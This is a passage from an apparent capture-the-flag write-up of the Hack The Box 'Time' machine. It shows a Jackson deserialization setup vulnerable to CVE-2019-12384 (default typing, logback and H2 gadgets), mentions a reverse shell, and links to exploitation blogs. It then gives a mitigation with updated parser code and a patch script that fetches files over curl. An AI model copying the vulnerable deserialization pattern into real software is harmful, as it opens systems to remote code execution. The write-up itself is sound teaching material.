<span class="n">f</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">)</span>
<span class="n">content</span> <span class="o">=</span> <span class="n">f</span>
<span class="nb">puts</span> <span class="n">content</span>

<span class="n">mapper</span> <span class="o">=</span> <span class="no">ObjectMapper</span><span class="o">.</span><span class="n">new</span>
<span class="n">mapper</span><span class="o">.</span><span class="n">enableDefaultTyping</span><span class="p">()</span> <span class="c1"># Condition #2, the uses of &#34;default typing&#34;.</span>
<span class="n">mapper</span><span class="o">.</span><span class="n">configure</span><span class="p">(</span><span class="no">SerializationFeature</span><span class="o">::</span><span class="no">FAIL_ON_EMPTY_BEANS</span><span class="p">,</span> <span class="kp">false</span><span class="p">);</span>
<span class="n">obj</span> <span class="o">=</span> <span class="n">mapper</span><span class="o">.</span><span class="n">readValue</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Object</span><span class="o">.</span><span class="n">java_class</span><span class="p">)</span> <span class="c1"># invokes all the setters</span>
<span class="nb">puts</span> <span class="s2">&#34;stringified: &#34;</span> <span class="o">+</span> <span class="n">mapper</span><span class="o">.</span><span class="n">writeValueAsString</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
</code></pre></div><p>The third condition is fulfilled by <code>logback-core-1.3.0-alpha5.jar</code> as the gadget class and <code>h2–1.4.199.jar</code> for the RCE capability. According to this <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">blog</a>, the H2 database alias feature can be abused. The researcher of CVE-2019–12384 abuses the alias feature to embed Java code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">root@time:/opt/json_project# grep -Ri version
Binary file classpath/h2-1.4.199.jar matches
Binary file classpath/jackson-databind-2.9.8.jar matches
Binary file classpath/logback-core-1.3.0-alpha5.jar matches
Binary file classpath/jackson-core-2.9.8.jar matches
</code></pre></div><h4 id="mitigation">Mitigation</h4>
<p>After I make sure there is no one currently exploiting the box, I tried to update the Jackson library to the v2.11 and also applied the new feature to mitigate the deserialization attack on the source code. Here is the updated version of <code>parse.rb</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;java&#39;</span>

<span class="no">Dir</span><span class="o">[</span><span class="s2">&#34;/opt/json_project/classpath/*.jar&#34;</span><span class="o">].</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span>
      <span class="nb">require</span> <span class="n">f</span>
<span class="k">end</span>

<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.ObjectMapper&#39;</span>
<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.SerializationFeature&#39;</span>
<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.MapperFeature&#39;</span> <span class="c1"># ==&gt; Mitigation v2.11 </span>
<span class="n">f</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">)</span>
<span class="n">content</span> <span class="o">=</span> <span class="n">f</span>
<span class="nb">puts</span> <span class="n">content</span>

<span class="n">mapper</span> <span class="o">=</span> <span class="no">ObjectMapper</span><span class="o">.</span><span class="n">new</span>
<span class="n">mapper</span><span class="o">.</span><span class="n">activateDefaultTyping</span><span class="p">()</span> <span class="c1"># ==&gt; Mitigation v2.10, enableDefaultTyping() to activateDefaultTyping() </span>
<span class="n">mapper</span><span class="o">.</span><span class="n">configure</span><span class="p">(</span><span class="no">MapperFeature</span><span class="o">::</span><span class="no">BLOCK_UNSAFE_POLYMORPHIC_BASE_TYPES</span><span class="p">);</span> <span class="c1"># ==&gt; Mitigation v2.11 </span>
<span class="n">mapper</span><span class="o">.</span><span class="n">configure</span><span class="p">(</span><span class="no">SerializationFeature</span><span class="o">::</span><span class="no">FAIL_ON_EMPTY_BEANS</span><span class="p">,</span> <span class="kp">false</span><span class="p">);</span>
<span class="n">obj</span> <span class="o">=</span> <span class="n">mapper</span><span class="o">.</span><span class="n">readValue</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Object</span><span class="o">.</span><span class="n">java_class</span><span class="p">)</span> <span class="c1"># invokes all the setters</span>
<span class="nb">puts</span> <span class="s2">&#34;stringified: &#34;</span> <span class="o">+</span> <span class="n">mapper</span><span class="o">.</span><span class="n">writeValueAsString</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
</code></pre></div><p>I also write a dirty script to patch it as well as to revert the patch, so I can perform a quick test. The script is supposed to be executed  from Time where the updated parser and the newer version of Jackson are  hosted from my machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
</span><span class="cp"></span><span class="c1"># ./time.sh patch [ip]</span>
<span class="nv">project_path</span><span class="o">=</span><span class="s2">&#34;/opt/json_project/&#34;</span>
<span class="nv">new_jackson</span><span class="o">=</span><span class="s2">&#34;jackson-core-2.11.0.jar&#34;</span>
<span class="nv">old_jackson</span><span class="o">=</span><span class="s2">&#34;jackson-core-2.9.8.jar&#34;</span>

<span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;patch&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
	<span class="c1"># backup the original code</span>
	mkdir -p /dev/shm/orig/
	mv <span class="nv">$project_path</span><span class="s2">&#34;classpath/&#34;</span><span class="nv">$old_jackson</span> /dev/shm/orig/
	mv <span class="nv">$project_path</span><span class="s2">&#34;parse.rb&#34;</span> /dev/shm/orig/
	
	<span class="c1"># These file hosted from my machine</span>
	curl -s <span class="s2">&#34;http://</span><span class="nv">$2</span><span class="s2">/</span><span class="nv">$new_jackson</span><span class="s2">&#34;</span> &gt; /tmp/<span class="nv">$new_jackson</span>
	curl -s <span class="s2">&#34;http://</span><span class="nv">$2</span><span class="s2">/parse.rb&#34;</span> &gt;  /tmp/parse.rb
	
	<span class="c1"># move the updated parser and jackson</span>
	cp /tmp/<span class="nv">$new_jackson</span> <span class="nv">$project_path</span><span class="s2">&#34;classpath/&#34;</span><span class="nv">$new_jackson</span> 
	cp /tmp/parse.rb <span class="s2">&#34;</span><span class="nv">$project_path</span><span class="s2">&#34;</span>
	chmod +x <span class="nv">$project_path</span><span class="s2">&#34;parse.rb&#34;</span>
	
<span class="k">elif</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;restore&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
	rm <span class="nv">$project_path</span><span class="s2">&#34;classpath/&#34;</span><span class="nv">$new_jackson</span>
	rm <span class="nv">$project_path</span><span class="s2">&#34;parse.rb&#34;</span>
	
	mv <span class="s2">&#34;/dev/shm/orig/</span><span class="nv">$old_jackson</span><span class="s2">&#34;</span> <span class="nv">$project_path</span><span class="s2">&#34;classpath/&#34;</span>
	mv <span class="s2">&#34;/dev/shm/orig/parse.rb&#34;</span> <span class="nv">$project_path</span>
	
	rm /tmp/<span class="nv">$new_jackson</span> 
	rm /tmp/parse.rb
	rm -r /dev/shm/orig/
	
<span class="k">fi</span>
</code></pre></div><p>I tried to exploit the validator again by reproducing the same steps as  in the Foothold section, but this time my reverse shell didn’t connect  back. I checked the validator on the browser, and now it returned this  message.</p>
<pre><code>Validation failed: WARNING: An illegal reflective access operation has occurred
</code></pre><p><img class="img-container" src="imgs/image-20210509210620009.png" alt="image-20210509210620009"  />
</p>
<p>Well, it is working, isn’t it?</p>
<hr>
<h2 id="references">References</h2>
<p>Exploitation:</p>
<ul>
<li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">https://blog.doyensec.com/2019/07/22/jackson-gadgets.html</a></li>
<li><a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html</a></li>
</ul>
<p>Mitigation:</p>
<ul>
<li><a href="https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062">https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917">https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
